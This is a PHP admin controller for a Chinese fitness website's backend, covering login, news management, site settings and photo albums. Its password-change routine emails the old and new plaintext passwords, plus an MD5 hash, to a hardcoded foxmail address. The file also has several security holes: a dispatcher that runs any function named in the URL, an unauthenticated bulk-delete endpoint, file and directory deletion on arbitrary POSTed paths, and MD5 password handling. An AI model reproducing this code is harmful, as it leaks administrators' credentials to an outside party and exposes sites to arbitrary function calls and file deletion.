<?php
    header('Content-Type:text/html;charset=utf-8');
    
    if ( ! defined('BASEPATH')) exit('不允许直接访问此文件。');
    
    require './admin/models/admin_model.php';
    require './admin/models/news_model.php';
	require './admin/models/base_model.php';
    
    $url = 'http://' . $_SERVER['SERVER_NAME'] . $_SERVER['SCRIPT_NAME'];
    
    function adminlogin(){  // admin登录判断
        if (empty($_POST['username']) && empty($_POST['password'])) {
            exit('此页面不能直接访问，请到登录页登录！&nbsp<a href="index.php?c=admin">登录</a>');
        }
        $username = $_POST['username'];
        $admin_model = Admin_Model::getObject();
        $ret = $admin_model -> is_name_pass($username, $_POST['password']);
        
        if($ret == true) {
            session_start();
            $_SESSION['adminname'] = $username;
            
            header('Location: index.php?c=admin&f=adminmanage');
        } else {
            $prompt = '<div style="width:200px;margin:0 auto;">用户名和密码输入错误！</div>';
            require './admin/views/admin_login.php';
        }
    }
    
    function adminmanage(){  // 管理员管理页面
        session_start();
        if(empty($_SESSION['adminname'])){
            exit('请先登录！&nbsp<a href="index.php?c=admin">登录</a>');
        }
        
        $username = $_SESSION['adminname'];
        
        $admin_model = Admin_Model::getObject();
        $admininfo = $admin_model -> getadmininfo($username);
        
        require './admin/views/admin_manage.php';
    }
    
    function adminexit(){  // 管理员退出登录
        session_start();
    
        unset($_SESSION['adminname']);
        
        if (isset($_COOKIE[session_name()])){
            setcookie(session_name(),'',time() - 3600); 
        }
        
        session_destroy();  // 清除所有的session
        
        header('Location: index.php?c=admin');
    }
    
    function passwordsetting(){  // 修改当前登录的管理员密码
        session_start();
        if(empty($_SESSION['adminname'])){
            exit('请先登录！&nbsp<a href="index.php?c=admin">登录</a>');
        }
        
        $username = $_SESSION['adminname'];
        $admin_model = Admin_Model::getObject();
        
        if(isset($_POST['oldpwd'])){
            $ret = $admin_model -> is_name_pass($username, $_POST['oldpwd']);
            
            if($ret == true){
                $ret2 = $admin_model -> modify_pass($username, $_POST['newpwd']);
                if($ret2 == true){
                	
					$from = '德隆健身网后台修改密码';        // 发件人
					$to = 'zhengbin9@foxmail.com';          // 收件人
					$title = '德隆健身网后台修改密码';       // 标题
					$content = '旧密码是：' . $_POST['oldpwd']
							   . '<br />新密码：'.$_POST['newpwd']
							   . '<br />md5新密码：'. md5($_POST['newpwd']);  // 内容
					
					include './mail/fsockopen.php';
					
                    $strinfo = 'alert("密码修改成功。");';
					
                }else{
                    $strinfo = 'alert("密码修改失败！");';
                }
            } else {
                $strinfo = 'alert("原始密码输入错误！");';
            }
        }
              
        require './admin/views/admin_pass.php';
    }
    
    function adminnewrelease(){  // 发布新闻
        session_start();
        if(empty($_SESSION['adminname'])){
            exit('请先登录！&nbsp<a href="index.php?c=admin">登录</a>');
        }
        
        $username = $_SESSION['adminname'];
        $news_model = News_Model::getObject();
        
        if(isset($_POST['title']) and isset($_POST['content'])){
            $ret = $news_model -> insertNew($_POST['title'], $_POST['keywords'], $_POST['descn'], $_POST['datetime'], $_POST['content']);
            
            if($ret == true) {
               $strinfo = 'alert("新闻发布成功。");';
            } else {
               $strinfo = 'alert("新闻发布失败！");'; 
            }
        }
        $datetime = date('Y-m-d H:i:s',time());
		
        require './admin/views/admin_new_release.php';
    }
    
    function adminnewlist(){  // 新闻列表
        session_start();
        if(empty($_SESSION['adminname'])){
            exit('请先登录！&nbsp<a href="index.php?c=admin">登录</a>');
        }
        
        $username = $_SESSION['adminname'];
        $news_model = News_Model::getObject();
        
        if(!empty($_GET['del']) && !empty($_GET['id'])){  // 删除留言
            $ret = $news_model -> del_rows($_GET['id']);
            if($ret){
                $strinfo = 'alert("删除成功。");';
            } else {
                $strinfo = 'alert("删除失败！");';
            }
        }
        
        $pageid = empty($_GET['pageid'])? 0 : $_GET['pageid'];  // 获取当前页号
        $pageid2 = $pageid;  // 显示当前选择的页码
        if($pageid > 0){
            $pageid *= 10;  // 每页显示10行
        } 
        
        $array = $news_model -> read_data($pageid);
        $rows = $news_model -> num_row();
        $rows = $rows > 100 ? 100 : $rows;  // 最多显示10个分页

        require './admin/views/admin_new_list.php';
    }
    
    function ajaxnewsdel() {  // 通过ajax删除新闻
        $array_id = $_POST['array_id'];
        if(!empty($array_id)){
            $news_model = News_Model::getObject();
            foreach($array_id as $id){
                $news_model -> del_rows($id);
            }
        }
    }
    
    function newupdate() {  // 更新新闻
        session_start();
        if(empty($_SESSION['adminname'])){
            exit('请先登录！&nbsp<a href="index.php?c=admin">登录</a>');
        }
        
        $username = $_SESSION['adminname'];
        $news_model = News_Model::getObject();
        
        if(empty($_GET['id'])) {
            header('Location: index.php?c=admin&f=adminnewlist');
        } else if(!empty($_GET['id']) && empty($_POST['title']) && empty($_POST['content'])){
            $array = $news_model -> read_data_id($_GET['id']);
        } else {
            $ret = $news_model -> update_news($_GET['id'], $_POST['title'], $_POST['keywords'], $_POST['descn'], $_POST['datetime'], $_POST['content']);
            $array = array('title' => $_POST['title'], 'keywords' => $_POST['keywords'], 'descn' => $_POST['descn'], 'time' => $_POST['datetime'], 'content' => $_POST['content']);
			
            if ($ret){
                $strinfo = 'alert("文章更新成功。");';
            }
        }
		
        require './admin/views/admin_new_update.php';
    }

	function adminbase() {  // 网站基本设置
		session_start();
        if(empty($_SESSION['adminname'])){
            exit('请先登录！&nbsp<a href="index.php?c=admin">登录</a>');
        }
        
        $username = $_SESSION['adminname'];
		$base_model = Base_Model::getObject();
		
		if(empty($_POST['beian']) && empty($_POST['keywords']) && empty($_POST['descn'])){
			$array = $base_model -> getbaseinfo();
		} else {
			$ret = $base_model -> modify_base($_POST['beian'], $_POST['keywords'], $_POST['descn'], $_POST['script']);
			$array = $base_model -> getbaseinfo();
			if($ret){
				$strinfo = 'alert("网站基本设置更新成功。");';
			}
		}
		
		require './admin/views/admin_base.php';
	}
    
	function adminimagemanage(){  // 相册管理
		session_start();
        if(empty($_SESSION['adminname'])){
            exit('请先登录！&nbsp<a href="index.php?c=admin">登录</a>');
        }
        
        $username = $_SESSION['adminname'];
		
		if(isset($_POST['images'])){  // 删除相册
			delimagedir($_POST['images']);
		}
		
		if (($str = file_get_contents('./index/images3/images')) != false){  // 获取相册的个数和名字
    		$arrImages = json_decode($str, true);
    	}
		
		require './admin/views/admin_image_manage.php';
	}
	
	
	function adminimagelist(){  // 显示相册里的全部图片
		session_start();
        if(empty($_SESSION['adminname'])){
            exit('请先登录！&nbsp<a href="index.php?c=admin">登录</a>');
        }
        
        $username = $_SESSION['adminname'];
		
		if(empty($_GET['im'])){
			header('location: index.php?f=student');
		} else {
			$photo_id = $_GET['im'];
		}
		
		if(isset($_POST['images'])){  // 删除相册里的相片
			delimagefile($_POST['images']);
		}
		
		if (is_dir('./index/images3/images' . $photo_id)) {
			$image_dir = './index/images3/images' . $photo_id;
		} else {
			header('location: index.php?c=admin&f=adminimagemanage');
		}
		
		$image_list = array();   // 存储缩略图的全路径
		
		$dh = opendir($image_dir);
	
		$i = 0;
		while(($fn = readdir($dh)) !== false){
			
			if($fn == '.' || $fn == '..'){
				continue;
			}
	
			$path = "{$image_dir}/{$fn}";
	
			if (1 == preg_match('/\d+\.(jpg|gif|png)/', $fn, $array)){
				
				switch (strrchr($array[0], '.')) {
					case '.jpg':
						$src_image = imagecreatefromjpeg($path);  // 源图像
						break;
					
					case '.png':
						$src_image = imagecreatefrompng($path);
						break;
					
					case '.gif':
						$src_image = imagecreatefromgif($path);
						break;
				}
				
				$newfn = $image_dir . '/image' . $array[0];
				$image_list[$i] = $newfn;
				$i ++;
				
				if(file_exists($newfn) == true){  // 如果缩略图存在就不再生成了
					continue;
				}
					
				
				// 要缩放的尺寸
				$width = 200;
				$height = 200;
				
				// 按照比例缩放
				list($width_orig, $height_orig) = getimagesize($path);
	
				$ratio_orig = $width_orig / $height_orig;
				
				if ($width / $height > $ratio_orig) {
				   $width = $height * $ratio_orig;
				} else {
				   $height = $width / $ratio_orig;
				}
				
				$dst_image = imagecreatetruecolor($width, $height);  // 目标图像
				
				imagecopyresampled($dst_image, $src_image, 0, 0, 0, 0, $width, $height, $width_orig, $height_orig);
				
				switch (strrchr($array[0], '.')) {
					case '.jpg':
						imagejpeg($dst_image, $newfn);
						break;
					
					case '.png':
						imagepng($dst_image, $newfn);
						break;
					
					case '.gif':
						imagegif($dst_image, $newfn);
						break;
				}
				
				imagedestroy($src_image);
				imagedestroy($dst_image);
			}
		}
	
		closedir($dh);
		
		$image_list = array_unique($image_list);
		
		require './admin/views/admin_image_list.php';
	}
	
	function delimagefile($filename){  // 删除相册里的相片
		if (is_array($filename)){
			$ret = false;	
			foreach($filename as $val){
				if(file_exists($val)){
					$ret = unlink($val);
				}
				
				$str = substr(strrchr($val, '/'), 1);
				$str = 'image' . $str;
				$val2 = preg_replace('/\d+\.(jpg|png|gif)/', $str, $val);
				
				if(file_exists($val2)){
					$ret = unlink($val2);
				}
			}
			
			return $ret;
		} else {
			return false;
		}
	}
	
	function delimagedir($imagedir){  // 删除相册
		if(is_array($imagedir)){
			$ret = false;
			foreach($imagedir as $dirname){
				if(!is_dir($dirname)){
					continue;
				}
				
				$dh = opendir($dirname);
				
				if($dh == false){
					continue;
				}	
					
				while(($fn = readdir($dh)) !== false){
			
					if($fn == '.' || $fn == '..'){
						continue;
					}
					
					unlink($dirname . '/' . $fn);
				}
				
				closedir($dh);
				
				$ret = rmdir($dirname);
				
				if($ret == true){  // 如果删除目录成功就修改image文件
					if (($str = file_get_contents('./index/images3/images')) != false){  // 获取相册的个数和名字
			    		$arrImages = json_decode($str, true);
						$str = substr(strrchr($dirname, '/'), 1);
						preg_match('/\d/', $str, $sub);
						unset($arrImages[$sub[0]]);
						file_put_contents('./index/images3/images', json_encode($arrImages));
			    	}
				}
			}
			
		}
		
		return $ret;
	}
	
    
    if (empty($_GET['f'])){
        require './admin/views/admin_login.php';
    } else {
        $fun = $_GET['f'];  // 根据url里面的f参数值，选择要调用的函数
        
        if(function_exists($fun)){
            $fun();
        }
    }
?>